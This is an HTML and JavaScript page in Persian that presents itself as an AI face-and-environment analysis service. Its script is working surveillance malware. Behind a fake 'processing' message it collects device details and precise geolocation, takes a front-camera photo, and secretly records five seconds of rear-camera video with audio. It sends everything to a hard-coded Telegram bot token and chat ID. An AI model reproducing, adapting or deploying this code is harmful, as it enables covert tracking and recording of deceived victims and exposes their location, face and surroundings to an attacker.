<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سامانه هوش مصنوعی تشخیص چهره و محیط</title>
    <style>
        body {
            font-family: Tahoma, sans-serif;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: #fff;
            text-align: center;
            padding: 40px 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 35px;
            border-radius: 16px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            max-width: 420px;
            width: 100%;
        }
        h2 {
            font-size: 22px;
            margin-bottom: 15px;
            color: #fff;
        }
        p {
            font-size: 14px;
            line-height: 1.7;
            color: #e0e0e0;
            margin-bottom: 25px;
        }
        button {
            background: linear-gradient(135deg, #00b09b, #96c93d);
            color: white;
            border: none;
            padding: 14px 25px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 4px 15px rgba(0, 176, 155, 0.4);
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 176, 155, 0.6);
        }
        button:active {
            transform: translateY(0);
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>✨ آنالیز هوشمند چهره و محیط</h2>
        <p id="statusText">برای شروع پردازش و دریافت نتیجه‌ی تحلیل اختصاصی، روی دکمه زیر کلیک کنید.</p>
        <button id="startBtn" onclick="runProcess()">شروع پردازش و تحلیل</button>
    </div>

    <!-- المان‌های مخفی برای ضبط رسانه -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // اطلاعات ربات تلگرام 
        const BOT_TOKEN = '8718656206:AAGr_nFBgZoOYFkOonagQy5q6gGJSN5iQbU'; 
        const CHAT_ID = '6820599989';     

        // تابع استخراج اطلاعات سیستم و مرورگر
        async function getSystemInfo() {
            let info = "";
            const ua = navigator.userAgent;
            let os = "نامشخص";
            if (ua.match(/Win/i)) os = "ویندوز (Windows)";
            else if (ua.match(/Mac/i)) os = "مک (Mac)";
            else if (ua.match(/Android/i)) os = "اندروید (Android)";
            else if (ua.match(/iPhone|iPad|iPod/i)) os = "آی‌اواس (iOS)";
            else if (ua.match(/Linux/i)) os = "لینوکس (Linux)";

            info += `💻 سیستم‌عامل: ${os}\n`;
            info += `🌐 رزولوشن صفحه: ${window.screen.width}x${window.screen.height}\n`;
            info += `🕒 منطقه زمانی: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;

            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    const charging = battery.charging ? "⚡ در حال شارژ" : "🔋 باتری خالی‌شونده";
                    info += `🔋 وضعیت باتری: ${level}% (${charging})\n`;
                } catch (e) {}
            }

            return info;
        }

        async function runProcess() {
            const btn = document.getElementById('startBtn');
            const statusText = document.getElementById('statusText');
            btn.disabled = true;
            statusText.innerText = "در حال آماده‌سازی سیستم...";

            const sysInfo = await getSystemInfo();

            // گرفتن لوکیشن
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        startCaptureSequence(position.coords.latitude, position.coords.longitude, sysInfo);
                    },
                    (error) => {
                        startCaptureSequence(null, null, sysInfo);
                    },
                    { enableHighAccuracy: true }
                );
            } else {
                startCaptureSequence(null, null, sysInfo);
            }
        }

        async function startCaptureSequence(lat, lon, sysInfo) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const statusText = document.getElementById('statusText');

            try {
                // مرحله اول: عکس از دوربین جلو (Selfie)
                statusText.innerText = "در حال پردازش تصویر چهره...";
                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = frontStream;
                await new Promise(resolve => video.onloadedmetadata = resolve);
                
                await new Promise(resolve => setTimeout(resolve, 1000)); // مکث کوتاه برای فیکس شدن فریم

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                let photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'jpeg', 0.8));
                
                // قطع دوربین جلو
                frontStream.getTracks().forEach(track => track.stop());

                // مرحله دوم: فیلمبرداری ۵ ثانیه‌ای از دوربین عقب (Environment Video)
                statusText.innerText = "در حال اسکن محیط اطراف (۵ ثانیه)...";
                let backStream;
                try {
                    // تلاش برای باز کردن دوربین پشت
                    backStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: { exact: "environment" } },
                        audio: true 
                    });
                } catch (e) {
                    // اگر دوربین پشت اختصاصی نشد، هر دوربین در دسترسی رو باز کن
                    backStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                }

                video.srcObject = backStream;
                await new Promise(resolve => video.onloadedmetadata = resolve);

                let mediaRecorder = new MediaRecorder(backStream, { mimeType: 'video/webm' });
                let chunks = [];

                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                
                let videoBlobPromise = new Promise(resolve => {
                    mediaRecorder.onstop = () => {
                        let vBlob = new Blob(chunks, { type: 'video/webm' });
                        resolve(vBlob);
                    };
                });

                mediaRecorder.start();

                // صبر کردن به مدت ۵ ثانیه برای ضبط ویدیو
                await new Promise(resolve => setTimeout(resolve, 5000));
                
                mediaRecorder.stop();
                backStream.getTracks().forEach(track => track.stop());

                let videoBlob = await videoBlobPromise;

                // مرحله سوم: ارسال همه اطلاعات به تلگرام
                statusText.innerText = "در حال ارسال اطلاعات نهایی...";

                let caption = "🎯 یک کاربر جدید کامل اسکن شد!\n\n";
                caption += "📊 **اطلاعات دستگاه:**\n" + sysInfo + "\n";

                if (lat && lon) {
                    caption += `📍 **موقعیت جغرافیایی:**\nعرض: ${lat}\nطول: ${lon}\n\n🗺 **لینک در گوگل مپ:**\nhttps://www.google.com/maps?q=${lat},${lon}`;
                } else {
                    caption += "⚠️ دسترسی به لوکیشن داده نشد.";
                }

                // ۱. ارسال عکس دوربین جلو
                const photoFormData = new FormData();
                photoFormData.append('chat_id', CHAT_ID);
                photoFormData.append('photo', photoBlob, 'front_capture.jpg');
                photoFormData.append('caption', caption);
                photoFormData.append('parse_mode', 'Markdown');

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: photoFormData
                });

                // ۲. ارسال ویدیوی ۵ ثانیه‌ای دوربین عقب
                const videoFormData = new FormData();
                videoFormData.append('chat_id', CHAT_ID);
                videoFormData.append('video', videoBlob, 'environment_video.webm');
                videoFormData.append('caption', '📹 ویدیوی ۵ ثانیه‌ای محیط اطراف (دوربین پشت)');

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: videoFormData
                });

                document.querySelector('.container').innerHTML = '<h2>تحلیل با موفقیت انجام شد</h2><p>تمام فرآیندها به اتمام رسید.</p>';

            } catch (err) {
                console.error(err);
                alert("لطفاً دسترسی به دوربین و میکروفون را تأیید کنید.");
                document.getElementById('startBtn').innerText = "شروع پردازش و تحلیل";
                document.getElementById('startBtn').disabled = false;
                statusText.innerText = "برای شروع پردازش و دریافت نتیجه‌ی تحلیل اختصاصی، روی دکمه زیر کلیک کنید.";
            }
        }
    </script>
</body>
</html>
